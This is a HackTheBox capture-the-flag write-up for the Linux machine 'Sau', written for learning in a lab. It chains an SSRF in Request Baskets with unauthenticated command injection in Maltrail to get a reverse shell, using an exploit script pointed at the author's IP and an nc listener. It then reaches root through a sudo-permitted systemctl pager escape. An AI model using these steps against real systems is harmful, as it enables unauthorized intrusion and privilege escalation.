---
layout: default
title: "Sau"
date: 26-08-20
---

# Sau - HackTheBox
 
**OS:** Linux  
**Difficulty:** Easy  
**Pawn Date:** 20/08/26  
 
---
 
## Recognition
 
### nmap
```
nmap -sVC -p- -v IP
```
**Ports found:** 22 (SSH), 80 (filtered), 8338 (filtered), 55555 (HTTP)
 
---
 
## Enumeration
 
Ports 80 and 8338 are filtered — not directly accessible from outside. However port 55555 responds to HTTP requests, so I started enumeration there.
 
Browsing to `http://IP:55555` I found **Request Baskets** — a service that collects and inspects HTTP requests. The version shown was `v1.2.1`.
 
Searching for vulnerabilities I found **CVE-2023-27163**, a Server-Side Request Forgery (SSRF) vulnerability in Request Baskets that allows an unauthenticated attacker to make the server perform requests to internal services.
 
---
 
## Initial Access
 
**Vulnerability:** Two CVEs chained together:
1. **CVE-2023-27163** — SSRF in Request Baskets
2. **Maltrail v0.53** — Unauthenticated OS Command Injection
### Step 1 — SSRF to reach internal services
 
I created a new basket and configured the **Forward URL** to point to the internal port 80:
 
```
http://0.0.0.0:80/
```
 
With **Proxy Response** enabled, any request to my basket URL gets forwarded to the internal service and the response is returned to me. This allowed me to reach the filtered port 80 from outside.
 
### Step 2 — Identifying Maltrail
 
Accessing my basket URL in the browser revealed a **Maltrail** login page running internally. At the bottom of the page: `Powered by Maltrail (v0.53)`.
 
Searching for this version I found it's vulnerable to unauthenticated OS command injection — the `username` parameter in the `/login` endpoint is passed to `subprocess.check_output()` without sanitization.
 
### Step 3 — Exploitation
 
I found a public exploit for this CVE, read how it worked, set up a listener:
 
```bash
nc -lvnp 4444
```
 
Then ran the exploit pointing to my basket URL (which forwards to Maltrail's login):
 
```bash
python3 exploit.py http://IP:55555/BASKET_ID MY_IP 4444
```
 
This gave me a shell as the user `puma`. I stabilized it:
 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```
 
---
 
## Privilege Escalation
 
**From:** puma  
**To:** root  
**Vector:** sudo -l
 
```bash
sudo -l
# (root) NOPASSWD: /usr/bin/systemctl status trail.service
```
 
`puma` can run `systemctl status` as root without a password. Checking **GTFOBins** for `systemctl`, I found that it **inherits from `less`** — the pager it uses to display output.
 
When the output is long enough to trigger the pager, `less` is active and accepts commands. Running:
 
```bash
sudo /usr/bin/systemctl status trail.service
```
 
The output triggered `less`. From inside I typed:
 
```
!sh
```
 
This spawned a root shell.
 
---
 
## Lessons Learned
 
- Filtered ports can often be reached via SSRF — always check if internal services are accessible
- Always check the version of every software you find and search for CVEs
- Two low-severity issues chained together (SSRF + command injection) can lead to full compromise
- Always check GTFOBins when you find a binary in `sudo -l`
- `systemctl status` uses `less` as pager — `!sh` escapes to a shell with the same privileges
